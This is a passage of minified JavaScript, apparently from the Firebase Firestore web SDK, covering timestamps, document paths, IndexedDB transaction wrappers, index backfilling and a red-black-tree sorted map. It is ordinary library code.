this.forceRefresh=!1,this.appCheck?this.appCheck.getToken(e).then(t=>t?(Q(typeof t.token=="string"),this.R=t.token,new l_(t.token)):null):Promise.resolve(null)}invalidateToken(){this.forceRefresh=!0}shutdown(){this.appCheck&&this.o&&this.appCheck.removeTokenListener(this.o),this.o=void 0}};function fB(n){let e=typeof self<"u"&&(self.crypto||self.msCrypto),t=new Uint8Array(n);if(e&&typeof e.getRandomValues=="function")e.getRandomValues(t);else for(let r=0;r<n;r++)t[r]=Math.floor(256*Math.random());return t}var vf=class{static newId(){let e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",t=Math.floor(256/e.length)*e.length,r="";for(;r.length<20;){let i=fB(40);for(let o=0;o<i.length;++o)r.length<20&&i[o]<t&&(r+=e.charAt(i[o]%e.length))}return r}};function re(n,e){return n<e?-1:n>e?1:0}function Xs(n,e,t){return n.length===e.length&&n.every((r,i)=>t(r,e[i]))}function TM(n){return n+"\0"}var $e=class n{constructor(e,t){if(this.seconds=e,this.nanoseconds=t,t<0)throw new k(N.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(t>=1e9)throw new k(N.INVALID_ARGUMENT,"Timestamp nanoseconds out of range: "+t);if(e<-62135596800)throw new k(N.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e);if(e>=253402300800)throw new k(N.INVALID_ARGUMENT,"Timestamp seconds out of range: "+e)}static now(){return n.fromMillis(Date.now())}static fromDate(e){return n.fromMillis(e.getTime())}static fromMillis(e){let t=Math.floor(e/1e3),r=Math.floor(1e6*(e-1e3*t));return new n(t,r)}toDate(){return new Date(this.toMillis())}toMillis(){return 1e3*this.seconds+this.nanoseconds/1e6}_compareTo(e){return this.seconds===e.seconds?re(this.nanoseconds,e.nanoseconds):re(this.seconds,e.seconds)}isEqual(e){return e.seconds===this.seconds&&e.nanoseconds===this.nanoseconds}toString(){return"Timestamp(seconds="+this.seconds+", nanoseconds="+this.nanoseconds+")"}toJSON(){return{seconds:this.seconds,nanoseconds:this.nanoseconds}}valueOf(){let e=this.seconds- -62135596800;return String(e).padStart(12,"0")+"."+String(this.nanoseconds).padStart(9,"0")}};var ee=class n{constructor(e){this.timestamp=e}static fromTimestamp(e){return new n(e)}static min(){return new n(new $e(0,0))}static max(){return new n(new $e(253402300799,999999999))}compareTo(e){return this.timestamp._compareTo(e.timestamp)}isEqual(e){return this.timestamp.isEqual(e.timestamp)}toMicroseconds(){return 1e6*this.timestamp.seconds+this.timestamp.nanoseconds/1e3}toString(){return"SnapshotVersion("+this.timestamp.toString()+")"}toTimestamp(){return this.timestamp}};var _f=class n{constructor(e,t,r){t===void 0?t=0:t>e.length&&z(),r===void 0?r=e.length-t:r>e.length-t&&z(),this.segments=e,this.offset=t,this.len=r}get length(){return this.len}isEqual(e){return n.comparator(this,e)===0}child(e){let t=this.segments.slice(this.offset,this.limit());return e instanceof n?e.forEach(r=>{t.push(r)}):t.push(e),this.construct(t)}limit(){return this.offset+this.length}popFirst(e){return e=e===void 0?1:e,this.construct(this.segments,this.offset+e,this.length-e)}popLast(){return this.construct(this.segments,this.offset,this.length-1)}firstSegment(){return this.segments[this.offset]}lastSegment(){return this.get(this.length-1)}get(e){return this.segments[this.offset+e]}isEmpty(){return this.length===0}isPrefixOf(e){if(e.length<this.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}isImmediateParentOf(e){if(this.length+1!==e.length)return!1;for(let t=0;t<this.length;t++)if(this.get(t)!==e.get(t))return!1;return!0}forEach(e){for(let t=this.offset,r=this.limit();t<r;t++)e(this.segments[t])}toArray(){return this.segments.slice(this.offset,this.limit())}static comparator(e,t){let r=Math.min(e.length,t.length);for(let i=0;i<r;i++){let o=e.get(i),s=t.get(i);if(o<s)return-1;if(o>s)return 1}return e.length<t.length?-1:e.length>t.length?1:0}},ve=class n extends _f{construct(e,t,r){return new n(e,t,r)}canonicalString(){return this.toArray().join("/")}toString(){return this.canonicalString()}toUriEncodedString(){return this.toArray().map(encodeURIComponent).join("/")}static fromString(...e){let t=[];for(let r of e){if(r.indexOf("//")>=0)throw new k(N.INVALID_ARGUMENT,`Invalid segment (${r}). Paths must not contain // in them.`);t.push(...r.split("/").filter(i=>i.length>0))}return new n(t)}static emptyPath(){return new n([])}},pB=/^[_a-zA-Z][_a-zA-Z0-9]*$/,Je=class n extends _f{construct(e,t,r){return new n(e,t,r)}static isValidIdentifier(e){return pB.test(e)}canonicalString(){return this.toArray().map(e=>(e=e.replace(/\\/g,"\\\\").replace(/`/g,"\\`"),n.isValidIdentifier(e)||(e="`"+e+"`"),e)).join(".")}toString(){return this.canonicalString()}isKeyField(){return this.length===1&&this.get(0)==="__name__"}static keyField(){return new n(["__name__"])}static fromServerFormat(e){let t=[],r="",i=0,o=()=>{if(r.length===0)throw new k(N.INVALID_ARGUMENT,`Invalid field path (${e}). Paths must not be empty, begin with '.', end with '.', or contain '..'`);t.push(r),r=""},s=!1;for(;i<e.length;){let a=e[i];if(a==="\\"){if(i+1===e.length)throw new k(N.INVALID_ARGUMENT,"Path has trailing escape character: "+e);let c=e[i+1];if(c!=="\\"&&c!=="."&&c!=="`")throw new k(N.INVALID_ARGUMENT,"Path has invalid escape sequence: "+e);r+=c,i+=2}else a==="`"?(s=!s,i++):a!=="."||s?(r+=a,i++):(o(),i++)}if(o(),s)throw new k(N.INVALID_ARGUMENT,"Unterminated ` in path: "+e);return new n(t)}static emptyPath(){return new n([])}};var q=class n{constructor(e){this.path=e}static fromPath(e){return new n(ve.fromString(e))}static fromName(e){return new n(ve.fromString(e).popFirst(5))}static empty(){return new n(ve.emptyPath())}get collectionGroup(){return this.path.popLast().lastSegment()}hasCollectionId(e){return this.path.length>=2&&this.path.get(this.path.length-2)===e}getCollectionGroup(){return this.path.get(this.path.length-2)}getCollectionPath(){return this.path.popLast()}isEqual(e){return e!==null&&ve.comparator(this.path,e.path)===0}toString(){return this.path.toString()}static comparator(e,t){return ve.comparator(e.path,t.path)}static isDocumentKey(e){return e.length%2==0}static fromSegments(e){return new n(new ve(e.slice()))}};var ea=class{constructor(e,t,r,i){this.indexId=e,this.collectionGroup=t,this.fields=r,this.indexState=i}};function h_(n){return n.fields.find(e=>e.kind===2)}function so(n){return n.fields.filter(e=>e.kind!==2)}ea.UNKNOWN_ID=-1;var Ys=class{constructor(e,t){this.fieldPath=e,this.kind=t}};var vu=class n{constructor(e,t){this.sequenceNumber=e,this.offset=t}static empty(){return new n(0,mn.min())}};function SM(n,e){let t=n.toTimestamp().seconds,r=n.toTimestamp().nanoseconds+1,i=ee.fromTimestamp(r===1e9?new $e(t+1,0):new $e(t,r));return new mn(i,q.empty(),e)}function AM(n){return new mn(n.readTime,n.key,-1)}var mn=class n{constructor(e,t,r){this.readTime=e,this.documentKey=t,this.largestBatchId=r}static min(){return new n(ee.min(),q.empty(),-1)}static max(){return new n(ee.max(),q.empty(),-1)}};function oE(n,e){let t=n.readTime.compareTo(e.readTime);return t!==0?t:(t=q.comparator(n.documentKey,e.documentKey),t!==0?t:re(n.largestBatchId,e.largestBatchId))}var MM="The current tab is not in the required state to perform this operation. It might be necessary to refresh the browser tab.",wf=class{constructor(){this.onCommittedListeners=[]}addOnCommittedListener(e){this.onCommittedListeners.push(e)}raiseOnCommittedEvent(){this.onCommittedListeners.forEach(e=>e())}};function Ai(n){return R(this,null,function*(){if(n.code!==N.FAILED_PRECONDITION||n.message!==MM)throw n;O("LocalStore","Unexpectedly lost primary lease")})}var M=class n{constructor(e){this.nextCallback=null,this.catchCallback=null,this.result=void 0,this.error=void 0,this.isDone=!1,this.callbackAttached=!1,e(t=>{this.isDone=!0,this.result=t,this.nextCallback&&this.nextCallback(t)},t=>{this.isDone=!0,this.error=t,this.catchCallback&&this.catchCallback(t)})}catch(e){return this.next(void 0,e)}next(e,t){return this.callbackAttached&&z(),this.callbackAttached=!0,this.isDone?this.error?this.wrapFailure(t,this.error):this.wrapSuccess(e,this.result):new n((r,i)=>{this.nextCallback=o=>{this.wrapSuccess(e,o).next(r,i)},this.catchCallback=o=>{this.wrapFailure(t,o).next(r,i)}})}toPromise(){return new Promise((e,t)=>{this.next(e,t)})}wrapUserFunction(e){try{let t=e();return t instanceof n?t:n.resolve(t)}catch(t){return n.reject(t)}}wrapSuccess(e,t){return e?this.wrapUserFunction(()=>e(t)):n.resolve(t)}wrapFailure(e,t){return e?this.wrapUserFunction(()=>e(t)):n.reject(t)}static resolve(e){return new n((t,r)=>{t(e)})}static reject(e){return new n((t,r)=>{r(e)})}static waitFor(e){return new n((t,r)=>{let i=0,o=0,s=!1;e.forEach(a=>{++i,a.next(()=>{++o,s&&o===i&&t()},c=>r(c))}),s=!0,o===i&&t()})}static or(e){let t=n.resolve(!1);for(let r of e)t=t.next(i=>i?n.resolve(i):r());return t}static forEach(e,t){let r=[];return e.forEach((i,o)=>{r.push(t.call(this,i,o))}),this.waitFor(r)}static mapArray(e,t){return new n((r,i)=>{let o=e.length,s=new Array(o),a=0;for(let c=0;c<o;c++){let l=c;t(e[l]).next(h=>{s[l]=h,++a,a===o&&r(s)},h=>i(h))}})}static doWhile(e,t){return new n((r,i)=>{let o=()=>{e()===!0?t().next(()=>{o()},i):r()};o()})}};var Ef=class n{constructor(e,t){this.action=e,this.transaction=t,this.aborted=!1,this.V=new lt,this.transaction.oncomplete=()=>{this.V.resolve()},this.transaction.onabort=()=>{t.error?this.V.reject(new fo(e,t.error)):this.V.resolve()},this.transaction.onerror=r=>{let i=sE(r.target.error);this.V.reject(new fo(e,i))}}static open(e,t,r,i){try{return new n(t,e.transaction(i,r))}catch(o){throw new fo(t,o)}}get m(){return this.V.promise}abort(e){e&&this.V.reject(e),this.aborted||(O("SimpleDb","Aborting transaction:",e?e.message:"Client-initiated abort"),this.aborted=!0,this.transaction.abort())}g(){let e=this.transaction;this.aborted||typeof e.commit!="function"||e.commit()}store(e){let t=this.transaction.objectStore(e);return new p_(t)}},_i=class n{constructor(e,t,r){this.name=e,this.version=t,this.p=r,n.S(za())===12.2&&Ze("Firestore persistence suffers from a bug in iOS 12.2 Safari that may cause your app to stop working. See https://stackoverflow.com/q/56496296/110915 for details and a potential workaround.")}static delete(e){return O("SimpleDb","Removing database:",e),ao(window.indexedDB.deleteDatabase(e)).toPromise()}static D(){if(!dl())return!1;if(n.v())return!0;let e=za(),t=n.S(e),r=0<t&&t<10,i=xM(e),o=0<i&&i<4.5;return!(e.indexOf("MSIE ")>0||e.indexOf("Trident/")>0||e.indexOf("Edge/")>0||r||o)}static v(){var e;return typeof process<"u"&&((e=process.__PRIVATE_env)===null||e===void 0?void 0:e.C)==="YES"}static F(e,t){return e.store(t)}static S(e){let t=e.match(/i(?:phone|pad|pod) os ([\d_]+)/i),r=t?t[1].split("_").slice(0,2).join("."):"-1";return Number(r)}M(e){return R(this,null,function*(){return this.db||(O("SimpleDb","Opening database:",this.name),this.db=yield new Promise((t,r)=>{let i=indexedDB.open(this.name,this.version);i.onsuccess=o=>{let s=o.target.result;t(s)},i.onblocked=()=>{r(new fo(e,"Cannot upgrade IndexedDB schema while another tab is open. Close all tabs that access Firestore and reload this page to proceed."))},i.onerror=o=>{let s=o.target.error;s.name==="VersionError"?r(new k(N.FAILED_PRECONDITION,"A newer version of the Firestore SDK was previously used and so the persisted data is not compatible with the version of the SDK you are now using. The SDK will operate with persistence disabled. If you need persistence, please re-upgrade to a newer version of the SDK or else clear the persisted IndexedDB data for your app to start fresh.")):s.name==="InvalidStateError"?r(new k(N.FAILED_PRECONDITION,"Unable to open an IndexedDB connection. This could be due to running in a private browsing session on a browser whose private browsing sessions do not support IndexedDB: "+s)):r(new fo(e,s))},i.onupgradeneeded=o=>{O("SimpleDb",'Database "'+this.name+'" requires upgrade from version:',o.oldVersion);let s=o.target.result;this.p.O(s,i.transaction,o.oldVersion,this.version).next(()=>{O("SimpleDb","Database upgrade to version "+this.version+" complete")})}})),this.N&&(this.db.onversionchange=t=>this.N(t)),this.db})}L(e){this.N=e,this.db&&(this.db.onversionchange=t=>e(t))}runTransaction(e,t,r,i){return R(this,null,function*(){let o=t==="readonly",s=0;for(;;){++s;try{this.db=yield this.M(e);let a=Ef.open(this.db,e,o?"readonly":"readwrite",r),c=i(a).next(l=>(a.g(),l)).catch(l=>(a.abort(l),M.reject(l))).toPromise();return c.catch(()=>{}),yield a.m,c}catch(a){let c=a,l=c.name!=="FirebaseError"&&s<3;if(O("SimpleDb","Transaction failed with error:",c.message,"Retrying:",l),this.close(),!l)return Promise.reject(c)}}})}close(){this.db&&this.db.close(),this.db=void 0}};function xM(n){let e=n.match(/Android ([\d.]+)/i),t=e?e[1].split(".").slice(0,2).join("."):"-1";return Number(t)}var f_=class{constructor(e){this.B=e,this.k=!1,this.q=null}get isDone(){return this.k}get K(){return this.q}set cursor(e){this.B=e}done(){this.k=!0}$(e){this.q=e}delete(){return ao(this.B.delete())}},fo=class extends k{constructor(e,t){super(N.UNAVAILABLE,`IndexedDB transaction '${e}' failed: ${t}`),this.name="IndexedDbTransactionError"}};function Mi(n){return n.name==="IndexedDbTransactionError"}var p_=class{constructor(e){this.store=e}put(e,t){let r;return t!==void 0?(O("SimpleDb","PUT",this.store.name,e,t),r=this.store.put(t,e)):(O("SimpleDb","PUT",this.store.name,"<auto-key>",e),r=this.store.put(e)),ao(r)}add(e){return O("SimpleDb","ADD",this.store.name,e,e),ao(this.store.add(e))}get(e){return ao(this.store.get(e)).next(t=>(t===void 0&&(t=null),O("SimpleDb","GET",this.store.name,e,t),t))}delete(e){return O("SimpleDb","DELETE",this.store.name,e),ao(this.store.delete(e))}count(){return O("SimpleDb","COUNT",this.store.name),ao(this.store.count())}U(e,t){let r=this.options(e,t),i=r.index?this.store.index(r.index):this.store;if(typeof i.getAll=="function"){let o=i.getAll(r.range);return new M((s,a)=>{o.onerror=c=>{a(c.target.error)},o.onsuccess=c=>{s(c.target.result)}})}{let o=this.cursor(r),s=[];return this.W(o,(a,c)=>{s.push(c)}).next(()=>s)}}G(e,t){let r=this.store.getAll(e,t===null?void 0:t);return new M((i,o)=>{r.onerror=s=>{o(s.target.error)},r.onsuccess=s=>{i(s.target.result)}})}j(e,t){O("SimpleDb","DELETE ALL",this.store.name);let r=this.options(e,t);r.H=!1;let i=this.cursor(r);return this.W(i,(o,s,a)=>a.delete())}J(e,t){let r;t?r=e:(r={},t=e);let i=this.cursor(r);return this.W(i,t)}Y(e){let t=this.cursor({});return new M((r,i)=>{t.onerror=o=>{let s=sE(o.target.error);i(s)},t.onsuccess=o=>{let s=o.target.result;s?e(s.primaryKey,s.value).next(a=>{a?s.continue():r()}):r()}})}W(e,t){let r=[];return new M((i,o)=>{e.onerror=s=>{o(s.target.error)},e.onsuccess=s=>{let a=s.target.result;if(!a)return void i();let c=new f_(a),l=t(a.primaryKey,a.value,c);if(l instanceof M){let h=l.catch(p=>(c.done(),M.reject(p)));r.push(h)}c.isDone?i():c.K===null?a.continue():a.continue(c.K)}}).next(()=>M.waitFor(r))}options(e,t){let r;return e!==void 0&&(typeof e=="string"?r=e:t=e),{index:r,range:t}}cursor(e){let t="next";if(e.reverse&&(t="prev"),e.index){let r=this.store.index(e.index);return e.H?r.openKeyCursor(e.range,t):r.openCursor(e.range,t)}return this.store.openCursor(e.range,t)}};function ao(n){return new M((e,t)=>{n.onsuccess=r=>{let i=r.target.result;e(i)},n.onerror=r=>{let i=sE(r.target.error);t(i)}})}var IA=!1;function sE(n){let e=_i.S(za());if(e>=12.2&&e<13){let t="An internal error was encountered in the Indexed Database server";if(n.message.indexOf(t)>=0){let r=new k("internal",`IOS_INDEXEDDB_BUG1: IndexedDb has thrown '${t}'. This is likely due to an unavoidable bug in iOS. See https://stackoverflow.com/q/56496296/110915 for details and a potential workaround.`);return IA||(IA=!0,setTimeout(()=>{throw r},0)),r}}return n}var g_=class{constructor(e,t){this.asyncQueue=e,this.Z=t,this.task=null}start(){this.X(15e3)}stop(){this.task&&(this.task.cancel(),this.task=null)}get started(){return this.task!==null}X(e){O("IndexBackfiller",`Scheduled in ${e}ms`),this.task=this.asyncQueue.enqueueAfterDelay("index_backfill",e,()=>R(this,null,function*(){this.task=null;try{O("IndexBackfiller",`Documents written: ${yield this.Z.ee()}`)}catch(t){Mi(t)?O("IndexBackfiller","Ignoring IndexedDB error during index backfill: ",t):yield Ai(t)}yield this.X(6e4)}))}},m_=class{constructor(e,t){this.localStore=e,this.persistence=t}ee(e=50){return R(this,null,function*(){return this.persistence.runTransaction("Backfill Indexes","readwrite-primary",t=>this.te(t,e))})}te(e,t){let r=new Set,i=t,o=!0;return M.doWhile(()=>o===!0&&i>0,()=>this.localStore.indexManager.getNextCollectionGroupToUpdate(e).next(s=>{if(s!==null&&!r.has(s))return O("IndexBackfiller",`Processing collection: ${s}`),this.ne(e,s,i).next(a=>{i-=a,r.add(s)});o=!1})).next(()=>t-i)}ne(e,t,r){return this.localStore.indexManager.getMinOffsetFromCollectionGroup(e,t).next(i=>this.localStore.localDocuments.getNextDocuments(e,t,i,r).next(o=>{let s=o.changes;return this.localStore.indexManager.updateIndexEntries(e,s).next(()=>this.re(i,o)).next(a=>(O("IndexBackfiller",`Updating offset: ${a}`),this.localStore.indexManager.updateCollectionGroup(e,t,a))).next(()=>s.size)}))}re(e,t){let r=e;return t.changes.forEach((i,o)=>{let s=AM(o);oE(s,r)>0&&(r=s)}),new mn(r.readTime,r.documentKey,Math.max(t.batchId,e.largestBatchId))}};var rn=(()=>{class n{constructor(t,r){this.previousValue=t,r&&(r.sequenceNumberHandler=i=>this.ie(i),this.se=i=>r.writeSequenceNumber(i))}ie(t){return this.previousValue=Math.max(t,this.previousValue),this.previousValue}next(){let t=++this.previousValue;return this.se&&this.se(t),t}}return n.oe=-1,n})();function Uu(n){return n==null}function _u(n){return n===0&&1/n==-1/0}function RM(n){return typeof n=="number"&&Number.isInteger(n)&&!_u(n)&&n<=Number.MAX_SAFE_INTEGER&&n>=Number.MIN_SAFE_INTEGER}function Vt(n){let e="";for(let t=0;t<n.length;t++)e.length>0&&(e=DA(e)),e=gB(n.get(t),e);return DA(e)}function gB(n,e){let t=e,r=n.length;for(let i=0;i<r;i++){let o=n.charAt(i);switch(o){case"\0":t+="";break;case"":t+="";break;default:t+=o}}return t}function DA(n){return n+""}function qn(n){let e=n.length;if(Q(e>=2),e===2)return Q(n.charAt(0)===""&&n.charAt(1)===""),ve.emptyPath();let t=e-2,r=[],i="";for(let o=0;o<e;){let s=n.indexOf("",o);switch((s<0||s>t)&&z(),n.charAt(s+1)){case"":let a=n.substring(o,s),c;i.length===0?c=a:(i+=a,c=i,i=""),r.push(c);break;case"":i+=n.substring(o,s),i+="\0";break;case"":i+=n.substring(o,s+1);break;default:z()}o=s+2}return new ve(r)}var CA=["userId","batchId"];function hf(n,e){return[n,Vt(e)]}function NM(n,e,t){return[n,Vt(e),t]}var mB={},yB=["prefixPath","collectionGroup","readTime","documentId"],vB=["prefixPath","collectionGroup","documentId"],_B=["collectionGroup","readTime","prefixPath","documentId"],wB=["canonicalId","targetId"],EB=["targetId","path"],IB=["path","targetId"],DB=["collectionId","parent"],CB=["indexId","uid"],bB=["uid","sequenceNumber"],TB=["indexId","uid","arrayValue","directionalValue","orderedDocumentKey","documentKey"],SB=["indexId","uid","orderedDocumentKey"],AB=["userId","collectionPath","documentId"],MB=["userId","collectionPath","largestBatchId"],xB=["userId","collectionGroup","largestBatchId"],PM=["mutationQueues","mutations","documentMutations","remoteDocuments","targets","owner","targetGlobal","targetDocuments","clientMetadata","remoteDocumentGlobal","collectionParents","bundles","namedQueries"],RB=[...PM,"documentOverlays"],kM=["mutationQueues","mutations","documentMutations","remoteDocumentsV14","targets","owner","targetGlobal","targetDocuments","clientMetadata","remoteDocumentGlobal","collectionParents","bundles","namedQueries","documentOverlays"],OM=kM,aE=[...OM,"indexConfiguration","indexState","indexEntries"],NB=aE,PB=[...aE,"globals"];var wu=class extends wf{constructor(e,t){super(),this._e=e,this.currentSequenceNumber=t}};function dt(n,e){let t=H(n);return _i.F(t._e,e)}function bA(n){let e=0;for(let t in n)Object.prototype.hasOwnProperty.call(n,t)&&e++;return e}function bo(n,e){for(let t in n)Object.prototype.hasOwnProperty.call(n,t)&&e(t,n[t])}function FM(n){for(let e in n)if(Object.prototype.hasOwnProperty.call(n,e))return!1;return!0}var Fe=class n{constructor(e,t){this.comparator=e,this.root=t||Gn.EMPTY}insert(e,t){return new n(this.comparator,this.root.insert(e,t,this.comparator).copy(null,null,Gn.BLACK,null,null))}remove(e){return new n(this.comparator,this.root.remove(e,this.comparator).copy(null,null,Gn.BLACK,null,null))}get(e){let t=this.root;for(;!t.isEmpty();){let r=this.comparator(e,t.key);if(r===0)return t.value;r<0?t=t.left:r>0&&(t=t.right)}return null}indexOf(e){let t=0,r=this.root;for(;!r.isEmpty();){let i=this.comparator(e,r.key);if(i===0)return t+r.left.size;i<0?r=r.left:(t+=r.left.size+1,r=r.right)}return-1}isEmpty(){return this.root.isEmpty()}get size(){return this.root.size}minKey(){return this.root.minKey()}maxKey(){return this.root.maxKey()}inorderTraversal(e){return this.root.inorderTraversal(e)}forEach(e){this.inorderTraversal((t,r)=>(e(t,r),!1))}toString(){let e=[];return this.inorderTraversal((t,r)=>(e.push(`${t}:${r}`),!1)),`{${e.join(", ")}}`}reverseTraversal(e){return this.root.reverseTraversal(e)}getIterator(){return new Qs(this.root,null,this.comparator,!1)}getIteratorFrom(e){return new Qs(this.root,e,this.comparator,!1)}getReverseIterator(){return new Qs(this.root,null,this.comparator,!0)}getReverseIteratorFrom(e){return new Qs(this.root,e,this.comparator,!0)}},Qs=class{constructor(e,t,r,i){this.isReverse=i,this.nodeStack=[];let o=1;for(;!e.isEmpty();)if(o=t?r(e.key,t):1,t&&i&&(o*=-1),o<0)e=this.isReverse?e.left:e.right;else{if(o===0){this.nodeStack.push(e);break}this.nodeStack.push(e),e=this.isReverse?e.right:e.left}}getNext(){let e=this.nodeStack.pop(),t={key:e.key,value:e.value};if(this.isReverse)for(e=e.left;!e.isEmpty();)this.nodeStack.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack.push(e),e=e.left;return t}hasNext(){return this.nodeStack.length>0}peek(){if(this.nodeStack.length===0)return null;let e=this.nodeStack[this.nodeStack.length-1];return{key:e.key,value:e.value}}},Gn=class n{constructor(e,t,r,i,o){this.key=e,this.value=t,this.color=r??n.RED,this.left=i??n.EMPTY,this.right=o??n.EMPTY,this.size=this.left.size+1+this.right.size}copy(e,t,r,i,o){return new n(e??this.key,t??this.value,r??this.color,i??this.left,o??this.right)}isEmpty(){return!1}inorderTraversal(e){return this.left.inorderTraversal(e)||e(this.key,this.value)||this.right.inorderTraversal(e)}reverseTraversal(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)}min(){return this.left.isEmpty()?this:this.left.min()}minKey(){return this.min().key}maxKey(){return this.right.isEmpty()?this.key:this.right.maxKey()}insert(e,t,r){let i=this,o=r(e,i.key);return i=o<0?i.copy(null,null,null,i.left.insert(e,t,r),null):o===0?i.copy(null,t,null,null,null):i.copy(null,null,null,null,i.right.insert(e,t,r)),i.fixUp()}removeMin(){if(this.left.isEmpty())return n.EMPTY;let e=this;return e.left.isRed()||e.left.left.isRed()||(e=e.moveRedLeft()),e=e.copy(null,null,null,e.left.removeMin(),null),e.fixUp()}remove(e,t){let r,i=this;if(t(e,i.key)<0)i.left.isEmpty()||i.left.isRed()||i.left.left.isRed()||(i=i.moveRedLeft()),i=i.copy(null,null,null,i.left.remove(e,t),null);else{if(i.left.isRed()&&(i=i.rotateRight()),i.right.isEmpty()||i.right.isRed()||i.right.left.isRed()||(i=i.moveRedRight()),t(e,i.key)===0){if(i.right.isEmpty())return n.EMPTY;r=i.right.min(),i=i.copy(r.key,r.value,null,null,i.right.removeMin())}i=i.copy(null,null,null,null,i.right.remove(e,t))}return i.fixUp()}isRed(){return this.color}fixUp(){let e=this;return e.right.isRed()&&!e.left.isRed()&&(e=e.rotateLeft()),e.left.isRed()&&e.left.left.isRed()&&(e=e.rotateRight()),e.left.isRed()&&e.right.isRed()&&(e=e.colorFlip()),e}moveRedLeft(){let e=this.colorFlip();return e.right.left.isRed()&&(e=e.copy(null,null,null,null,e.right.rotateRight()),e=e.rotateLeft(),e=e.colorFlip()),e}moveRedRight(){let e=this.colorFlip();return e.left.left.isRed()&&(e=e.rotateRight(),e=e.colorFlip()),e}rotateLeft(){let e=this.copy(null,null,n.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)}rotateRight(){let e=this.copy(null,null,n.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)}colorFlip(){let e=this.left.copy(null,null,!this.left.color,null,null),t=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,t)}checkMaxDepth(){let e=this.check();return Math.pow(2,e)<=this.size+1}check(){if(this.isRed()&&this.left.isRed()||this.right.isRed())throw z();let e=this.left.check();if(e!==this.right.check())throw z();return e+(this.isRed()?0:1)}};Gn.EMPTY=null,Gn.RED=!0,Gn.BLACK=!1;Gn.EMPTY=new class{constructor(){this.size=0}get key(){throw z()}get value(){throw z()}get color(){throw z()}get left(){throw z()}get right(){throw z()}copy(e,t,r,i,o){return this}insert(e,t,r){return new Gn(e,t)}remove(e,t){return this}isEmpty(){return!0}inorderTraversal(e){return!1}reverseTraversal(e){return!1}minKey(){return null}maxKey(){return null}isRed(){return!1}checkMaxDepth(){return!0}check(){return 0}};var Re=class n{constructor(e){this.comparator=e,this.data=new Fe(this.comparator)}has(e){return this.data.get(e)!==null}first(){return this.data.minKey()}last(){return this.data.maxKey()}get size(){return this.data.size}indexOf(e){return this.data.indexOf(e)}forEach(e){this.data.inorderTraversal((t,r)=>(e(t),!1))}forEachInRange(e,t){let r=this.data.getIteratorFrom(e[0]);for(;r.hasNext();){let i=r.getNext();if(this.comparator(i.key,e[1])>=0)return;t(i.key)}}forEachWhile(e,t){let r;for(r=t!==void 0?this.data.getIteratorFrom(t):this.data.getIterator();r.hasNext();)if(!e(r.getNext().key))return}firstAfterOrEqual(e){let t=this.data.getIteratorFrom(e);return t.hasNext()?t.getNext().key:null}getIterator(){return new If(this.data.getIterator())}getIteratorFrom(e){return new If(this.data.getIteratorFrom(e))}add(e){return this.copy(this.data.remove(e).insert(e,!0))}delete(e){return this.has(e)?this.copy(this.data.remove(e)):this}isEmpty(){return this.data.isEmpty()}unionWith(e){let t=this;return t.size<e.size&&(t=e,e=this),e.forEach(r=>{t=t.add(r)}),t}isEqual(e){if(!(e instanceof n)||this.size!==e.size)return!1;let t=this.data.getIterator(),r=e.data.getIterator();for(;t.hasNext();){let i=t.getNext().key,o=r.getNext().key;if(this.comparator(i,o)!==0)return!1}return!0}toArray(){let e=[];return this.forEach(t=>{e.push(t)}),e}toString(){let e=[];return this.forEach(t=>e.push(t)),"SortedSet("+e.toString()+")"}copy(e){let t=new n(this.comparator);return t.data=e,t}},If=class{constructor(e){this.iter=e}getNext(){return this.iter.getNext().key}hasNext(){return this.iter.hasNext()}};function js(n){return n.hasNext()?n.getNext():void 0}var on=class n{constructor(e){this.fields=e,e.sort(Je.comparator)}static empty(){return new n([])}unionWith(e){let t=new Re(Je.comparator);for(let r of this.fields)t=t.add(r);for(let r of e)t=t.add(r);return new n(t.toArray())}covers(e){for(let t of this.fields)if(t.isPrefixOf(e))return!0;return!1}isEqual(e){return Xs(this.fields,e.fields,(t,r)=>t.isEqual(r))}};var Df=class extends Error{constructor(){super(...arguments),this.name="Base64DecodeError"}};function VM(){return typeof atob<"u"}var et=class n{constructor(e){this.binaryString=e}static fromBase64String(e){let t=function(i){try{return atob(i)}catch(o){throw typeof DOMException<"u"&&o instanceof DOMException?new Df("Invalid base64 string: "+o):o}}(e);return new n(t)}static fromUint8Array(e){let t=function(i){let o="";for(let s=0;s<i.length;++s)o+=String.fromCharCode(i[s]);return o}(e);return new n(t)}[Symbol.iterator](){let e=0;return{next:()=>e<this.binaryString.length?{value:this.binaryString.charCodeAt(e++),done:!1}:{value:void 0,done:!0}}}toBase64(){return function(t){return btoa(t)}(this.binaryString)}toUint8Array(){return function(t){let r=new Uint8Array(t.length);for(let i=0;i<t.length;i++)r[i]=t.charCodeAt(i);return r}(this.binaryString)}approximateByteSize(){return 2*this.binaryString.length}compareTo(e){return re(this.binaryString,e.binaryString)}isEqual(e){return this.binaryString===e.binaryString}};et.EMPTY_BYTE_STRING=new et("");var kB=new RegExp(/^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\d(?:\.(\d+))?Z$/);function Ar(n){if(Q(!!n),typeof n=="string"){let e=0,t=kB.exec(n);if(Q(!!t),t[1]){let i=t[1];i=(i+"000000000").substr(0,9),e=Number(i)}let r=new Date(n);return{seconds:Math.floor(r.getTime()/1e3),nanos:e}}return{seconds:je(n.seconds),nanos:je(n.nanos)}}function je(n){return typeof n=="number"?n:typeof n=="string"?Number(n):0}function wi(n){return typeof n=="string"?et.fromBase64String(n):et.fromUint8Array(n)}function pp(n){var e,t;return((t=(((e=n?.mapValue)===null||e===void 0?void 0:e.fields)||{}).__type__)===null||t===void 0?void 0:t.stringValue)==="server_timestamp"}function cE(n){let e=n.mapValue.fields.__previous_value__;return pp(e)?cE(e):e}function Eu(n){let e=Ar(n.mapValue.fields.__local_write_time__.timestampValue);return new $e(e.seconds,e.nanos)}var y_=class{constructor(e,t,r,i,o,s,a,c,l){this.databaseId=e,this.appId=t,this.persistenceKey=r,this.host=i,this.ssl=o,this.forceLongPolling=s,this.autoDetectLongPolling=a,this.longPollingOptions=c,this.useFetchStreams=l}},Ei=class 